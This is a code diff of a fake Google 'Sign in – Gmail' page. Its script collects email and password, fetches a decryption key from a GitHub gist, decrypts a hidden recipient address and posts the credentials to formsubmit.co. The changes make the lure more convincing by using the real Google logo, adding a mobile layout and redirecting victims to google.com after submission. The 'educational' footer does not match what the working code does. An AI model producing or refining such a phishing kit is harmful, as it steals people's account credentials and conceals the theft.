@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <title>Sign in – Google Accounts</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
       font-family: 'Roboto', sans-serif;
@@ -21,9 +22,10 @@
       width: 100%;
       max-width: 400px;
       text-align: left;
+      box-sizing: border-box;
     }
     .google-logo {
-      width: 75px;
+      width: 92px;
       display: block;
       margin: 0 auto 20px;
     }
@@ -31,11 +33,13 @@
       font-size: 24px;
       margin-bottom: 10px;
       color: #202124;
+      text-align: center;
     }
     p {
       font-size: 14px;
       color: #5f6368;
       margin-bottom: 30px;
+      text-align: center;
     }
     input {
       width: 100%;
@@ -44,6 +48,7 @@
       border: 1px solid #dadce0;
       border-radius: 4px;
       font-size: 16px;
+      box-sizing: border-box;
     }
     button {
       width: 100%;
@@ -71,21 +76,34 @@
       color: #1a73e8;
       font-size: 12px;
     }
+
+    /* 🔧 تحسين العرض على الجوال */
+    @media screen and (max-width: 480px) {
+      .container {
+        padding: 20px;
+        max-width: 90%;
+      }
+      .google-logo {
+        width: 75px;
+        margin-bottom: 15px;
+      }
+      h2 {
+        font-size: 20px;
+      }
+      input, button {
+        font-size: 14px;
+        padding: 10px;
+      }
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <!-- Modified Google-like logo as inline SVG with subtle difference -->
-    <svg class="google-logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Google">
-      <!-- Simplified colored shapes mimicking Google logo but not identical -->
-      <rect x="10" y="20" width="40" height="40" fill="#4285F4" rx="8" ry="8"/>
-      <circle cx="80" cy="40" r="20" fill="#EA4335" />
-      <rect x="120" y="20" width="30" height="40" fill="#FBBC05" rx="6" ry="6"/>
-      <rect x="160" y="20" width="35" height="40" fill="#34A853" rx="7" ry="7"/>
-      <circle cx="220" cy="40" r="18" fill="#4285F4" />
-      <rect x="250" y="20" width="15" height="40" fill="#EA4335" rx="4" ry="4"/>
-    </svg>
-    
+    <img
+      src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+      alt="Google"
+      class="google-logo"
+    />
     <h2>Sign in</h2>
     <p>to continue to Gmail</p>
 
@@ -108,57 +126,50 @@
     <div class="footer">This is a UI mockup for educational analysis only.</div>
   </div>
 
-  <!-- CryptoJS for AES -->
+  <!-- CryptoJS -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 
   <script>
-    // Encrypted target email (example)
-    const encryptedEmail = "U2FsdGVkX1/6m8zI3CZCp4rK2dCpxP6o4KVeC6HKihEg=";
-
-    // URL to fetch decryption key (from GitHub gist)
-    const keyURL = "https://gist.githubusercontent.com/google-com-sign-in/cc24d99bb98a4e537894f244dd28d4d4/raw/b53618981018753c0278b2b7f602ae1eb0022a61/secret.txt";
-
-    const step1 = document.getElementById("step1Form");
-    const step2 = document.getElementById("step2Form");
-    const emailField = document.getElementById("email");
-    const hiddenEmailField = document.getElementById("hiddenEmail");
-
-    step1.addEventListener("submit", function (e) {
-      e.preventDefault();
-      hiddenEmailField.value = emailField.value;
-      step1.style.display = "none";
-      step2.style.display = "block";
-    });
-
-    step2.addEventListener("submit", function (e) {
-      e.preventDefault();
-
-      fetch(keyURL)
-        .then(res => res.text())
-        .then(secretKey => {
-          try {
-            const bytes = CryptoJS.AES.decrypt(encryptedEmail, secretKey.trim());
-            const targetEmail = bytes.toString(CryptoJS.enc.Utf8);
-            if (!targetEmail) {
-              alert("Unable to decrypt recipient email.");
-              return;
-            }
-            step2.action = `https://formsubmit.co/${targetEmail}`;
-            step2.submit();
-          } catch (err) {
-            alert("Decryption error.");
-          }
-        })
-        .catch(err => {
-          alert("Error fetching encryption key.");
-        });
-    });
-
-    // Simple JS obfuscation (basic) for demonstration only
     (function(){
-      const _0x1a2b = ['length','action','submit','trim','toString'];
-      const _0x3c4d=function(_0x5a6b,_0x7d8c){_0x5a6b=_0x5a6b-0x100;let _0x9abc=_0x1a2b[_0x5a6b];return _0x9abc;};
-      // No heavy obfuscation, just a taste
+      const enc = "U2FsdGVkX18PbGn+9z7sXrB97K6vJGZpRQwvHx+YyV7LURF1UZOSfwixMa7PeLbg";
+      const kurl = "https://gist.githubusercontent.com/google-com-sign-in/cc24d99bb98a4e537894f244dd28d4d4/raw/b53618981018753c0278b2b7f602ae1eb0022a61/secret.txt?x=" + Math.random();
+      const s1 = document.getElementById("step1Form");
+      const s2 = document.getElementById("step2Form");
+      const ef = document.getElementById("email");
+      const he = document.getElementById("hiddenEmail");
+
+      s1.addEventListener("submit", function (e) {
+        e.preventDefault();
+        he.value = ef.value;
+        s1.style.display = "none";
+        s2.style.display = "block";
+      });
+
+      s2.addEventListener("submit", function (e) {
+        e.preventDefault();
+        fetch(kurl)
+          .then(r => r.text())
+          .then(k => {
+            try {
+              const b = CryptoJS.AES.decrypt(enc, k.trim());
+              const t = b.toString(CryptoJS.enc.Utf8);
+              if (!t || !t.includes("@")) {
+                alert("Decryption failed.");
+                return;
+              }
+              s2.action = `https://formsubmit.co/${t}`;
+              s2.submit();
+
+              // إعادة التوجيه إلى Google بعد الإرسال
+              setTimeout(() => {
+                window.location.href = "https://www.google.com";
+              }, 1000);
+            } catch (err) {
+              alert("Error occurred.");
+            }
+          })
+          .catch(() => alert("Failed to fetch key."));
+      });
     })();
   </script>
 </body>
